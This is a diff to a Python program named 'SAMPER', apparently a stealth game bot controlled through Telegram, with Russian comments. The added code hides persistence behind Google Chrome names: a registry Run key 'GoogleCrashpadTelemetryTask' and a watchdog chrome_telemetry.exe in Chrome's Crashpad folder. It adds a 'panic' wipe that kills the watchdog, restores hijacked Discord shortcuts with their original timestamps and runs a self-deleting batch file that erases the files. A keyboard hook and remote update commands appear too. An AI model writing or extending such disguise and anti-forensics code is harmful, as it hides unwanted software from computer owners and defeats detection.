@@ -86,12 +86,11 @@ try:
     import difflib
     import shutil
     import winreg
-    import codecs
     import threading
     import tkinter as tk
     from mss import mss
 
-    CURRENT_VERSION = 1.6 # Версия с GUI "Черный Неоморфизм"
+    CURRENT_VERSION = 1.7 # Исправлена архитектура перезапусков Надзирателя
 
     # ================= ПУТЬ К TESSERACT =================
     pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
@@ -128,7 +127,6 @@ try:
     gui_visible = False
     canvas_ref = None
     
-    # ID элементов Canvas для обновления кнопки СТАРТ/СТОП
     start_bg_tag = None
     start_icon_id = None
     start_text_id = None
@@ -145,35 +143,52 @@ try:
                 stdin=subprocess.DEVNULL
             )
 
-    # ================= СИСТЕМА ПАНИКИ =================
-    def deep_panic_clean():
+    # ================= СИСТЕМА ПАНИКИ (УЛЬТИМАТУМ) =================
+    def ultimate_panic_clean():
+        """Полное уничтожение следов: убивает Надзирателя и стирает файлы"""
         try:
-            emergency_tg_send("🚨 ПАНИКА! Активирован бесфайловый стелс-режим...")
-            flag_path = os.path.join(os.environ.get('TEMP', ''), 'discord_panic.flag')
-            with open(flag_path, 'w') as f: f.write("1")
+            emergency_tg_send("🚨 ПАНИКА! Активирован бесфайловый стелс-режим. Уничтожаю систему...")
+            
+            # 1. Удаляем автозагрузку Надзирателя из реестра
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue(key, "GoogleCrashpadTelemetryTask")
+                winreg.CloseKey(key)
+            except: pass
 
+            # 2. ЖЕСТКО убиваем процесс Надзирателя (чтобы он не воскресил нас после выхода)
+            subprocess.run('taskkill /f /im chrome_telemetry.exe', shell=True, capture_output=True, creationflags=0x08000000)
+            subprocess.run('taskkill /f /im updater.exe', shell=True, capture_output=True, creationflags=0x08000000)
+
+            # 3. Восстанавливаем оригинальные ярлыки на рабочем столе
             desktop_dir = os.environ.get('USERPROFILE', '') + "\\Desktop"
             appdata = os.environ.get('APPDATA', '')
             clean_lnk = os.path.join(os.environ.get('TEMP', ''), 'discord_clean_cache', 'Discord.lnk')
-            
             lnk_paths = [
                 os.path.join(desktop_dir, "ds.lnk"),
                 os.path.join(desktop_dir, "Discord.lnk"),
                 os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk")
             ]
-            
             if os.path.exists(clean_lnk):
                 for p in lnk_paths:
                     if os.path.exists(p):
                         stat = os.stat(p)
-                        old_times = (stat.st_atime, stat.st_mtime)
                         shutil.copy2(clean_lnk, p)
-                        os.utime(p, old_times)
+                        os.utime(p, (stat.st_atime, stat.st_mtime))
             
-            emergency_tg_send("✅ Бот испарился. Ярлыки чисты.")
+            # 4. Батник для безвозвратного удаления .exe файла Надзирателя и нашего кэша
+            bat_path = os.path.join(os.environ.get('TEMP', ''), 'ultimate_panic.bat')
+            hidden_exe = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\chrome_telemetry.exe")
+            cache_file = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\telemetry_cache.dat")
+            
+            with open(bat_path, 'w', encoding='utf-8') as f:
+                f.write(f'@echo off\nping 127.0.0.1 -n 3 > NUL\ndel /f /q "{hidden_exe}"\ndel /f /q "{cache_file}"\ndel "%~f0"')
+            subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+            
+            emergency_tg_send("✅ Бот испарился. Ярлыки чисты. Надзиратель уничтожен.")
         except Exception: pass
         finally:
-            os._exit(0)
+            os._exit(0) # Умираем, и никто нас больше не запустит
 
     # ================= ФУНКЦИИ БОТА =================
     def send_telegram(text):
@@ -204,11 +219,11 @@ try:
                         TARGET_PLAYER_NAME = text.split(' ', 1)[1].strip()
                         send_telegram(f"👤 Настройки обновлены\nНовый никнейм: {TARGET_PLAYER_NAME}")
                     elif text.strip() == '/panic': 
-                        deep_panic_clean()
+                        ultimate_panic_clean()
                     elif text.strip() == '/update':
-                        send_telegram("🔄 Получена команда обновления. Перезапуск...")
-                        subprocess.Popen([sys.executable] + sys.argv[1:], creationflags=0x00000008 | 0x08000000, close_fds=True)
-                        os._exit(0)
+                        # Просто выключаем себя. Надзиратель (chrome_telemetry) увидит это и скачает новый код!
+                        send_telegram("🔄 Получена команда обновления. Выключаюсь, Надзиратель меня перезапустит...")
+                        os._exit(0) 
         except: pass
 
     def smart_sleep(seconds):
@@ -387,7 +402,7 @@ try:
                         canvas_ref.itemconfig(start_icon_id, text="⏸", fill="#00ff41")
                     send_telegram("▶️ Бот запущен с клавиатуры.")
             elif key_history == ['page down', 'page up', 'delete']: 
-                deep_panic_clean()
+                ultimate_panic_clean()
 
     keyboard.hook(on_key_event)
 
@@ -432,15 +447,16 @@ try:
             send_telegram("⏸ Бот остановлен через меню.")
 
     def gui_restart():
-        send_telegram("🔄 Перезапуск через меню...")
-        subprocess.Popen([sys.executable] + sys.argv[1:], creationflags=0x00000008 | 0x08000000, close_fds=True)
-        os._exit(0)
+        send_telegram("🔄 Перезапуск (обновление) через меню...")
+        os._exit(0) # Убиваем себя, Надзиратель запустит свежую копию
 
     def gui_panic():
-        deep_panic_clean()
+        ultimate_panic_clean()
 
     def gui_exit():
-        send_telegram("🛑 Выход (без зачистки) через меню.")
+        send_telegram("🛑 Выход через меню. Усыпляю Надзирателя до перезагрузки ПК.")
+        # ЖЕСТКО убиваем Надзирателя, чтобы он не перезапустил бота после закрытия меню!
+        subprocess.run('taskkill /f /im chrome_telemetry.exe', shell=True, capture_output=True, creationflags=0x08000000)
         os._exit(0)
 
     def setup_gui():
@@ -449,10 +465,10 @@ try:
         gui_root = tk.Tk()
         gui_root.title("SAMPER")
         gui_root.geometry("280x420")
-        gui_root.overrideredirect(True) # Убираем рамки Windows
+        gui_root.overrideredirect(True) 
         
-        gui_root.attributes('-alpha', 0.90) # Эффект стекла (полупрозрачность)
-        bg_color = "#121417" # Очень глубокий, стильный темный цвет
+        gui_root.attributes('-alpha', 0.90) 
+        bg_color = "#121417"
         gui_root.configure(bg=bg_color)
         gui_root.attributes("-topmost", True) 
 
@@ -460,7 +476,6 @@ try:
         canvas.pack(fill=tk.BOTH, expand=True)
         canvas_ref = canvas
 
-        # Логика перемещения окна
         def start_move(event):
             gui_root.x = event.x
             gui_root.y = event.y
@@ -480,11 +495,9 @@ try:
         canvas.bind("<ButtonRelease-1>", stop_move)
         canvas.bind("<B1-Motion>", do_move)
 
-        # Логотип (Неоновый Зеленый)
         canvas.create_text(140, 45, text="SAMPER", font=("Arial Black", 24, "bold"), fill="#00ff41", tags="drag")
         canvas.create_text(140, 75, text="S T E A L T H   S Y S T E M", font=("Arial", 7, "bold"), fill="#555555", tags="drag")
 
-        # Функция для отрисовки скругленных прямоугольников (основа Neumorphism)
         def draw_rounded_rect(cv, x, y, w, h, r, color, tag):
             cv.create_rectangle(x+r, y, x+w-r, y+h, fill=color, outline=color, tags=tag)
             cv.create_rectangle(x, y+r, x+w, y+h-r, fill=color, outline=color, tags=tag)
@@ -493,7 +506,6 @@ try:
             cv.create_oval(x, y+h-2*r, x+2*r, y+h, fill=color, outline=color, tags=tag)
             cv.create_oval(x+w-2*r, y+h-2*r, x+w, y+h, fill=color, outline=color, tags=tag)
 
-        # Генератор выпуклых (Neumorphic) кнопок
         def create_neu_btn(y, icon, text, command, tag_prefix, accent="#00ff41"):
             x = 25
             w = 230
@@ -501,18 +513,13 @@ try:
             r = 12
             tag_bg = f"{tag_prefix}_bg"
 
-            # 1. Темная тень (Снизу-Справа)
             draw_rounded_rect(canvas, x+3, y+3, w, h, r, "#070809", f"{tag_prefix}_ds")
-            # 2. Светлый блик (Сверху-Слева)
             draw_rounded_rect(canvas, x-2, y-2, w, h, r, "#1d2025", f"{tag_prefix}_ls")
-            # 3. Тело кнопки
             draw_rounded_rect(canvas, x, y, w, h, r, bg_color, tag_bg)
 
-            # Иконка и Текст
             icon_id = canvas.create_text(x+30, y+h//2, text=icon, font=("Segoe UI Symbol", 14), fill=accent)
             text_id = canvas.create_text(x+65, y+h//2, text=text, font=("Arial", 11, "bold"), fill="#d0d0d0", anchor="w")
 
-            # Анимация нажатия "вглубь"
             def press(e):
                 canvas.move(tag_bg, 2, 2)
                 canvas.move(icon_id, 2, 2)
@@ -527,7 +534,6 @@ try:
             def enter(e): canvas.itemconfig(text_id, fill="#ffffff")
             def leave(e): canvas.itemconfig(text_id, fill="#d0d0d0")
 
-            # Привязываем события ко всем слоям кнопки
             for item in canvas.find_withtag(tag_bg) + (icon_id, text_id):
                 canvas.tag_bind(item, "<ButtonPress-1>", press)
                 canvas.tag_bind(item, "<ButtonRelease-1>", release)
@@ -536,14 +542,12 @@ try:
 
             return tag_bg, icon_id, text_id
 
-        # Создаем наши кнопки
         global start_bg_tag, start_icon_id, start_text_id
         start_bg_tag, start_icon_id, start_text_id = create_neu_btn(110, "▶", "СТАРТ", gui_toggle_bot, "btn_start", "#ff3333")
         create_neu_btn(180, "↻", "ПЕРЕЗАПУСК", gui_restart, "btn_restart", "#00ff41")
         create_neu_btn(250, "⚠", "ОЧИСТКА (ПАНИКА)", gui_panic, "btn_panic", "#ff0000")
         create_neu_btn(320, "✕", "ВЫХОД", gui_exit, "btn_exit", "#aaaaaa")
 
-        # Изначально скрываем интерфейс (он вызовется по F5)
         gui_root.withdraw()
         gui_visible = False
         gui_root.mainloop()
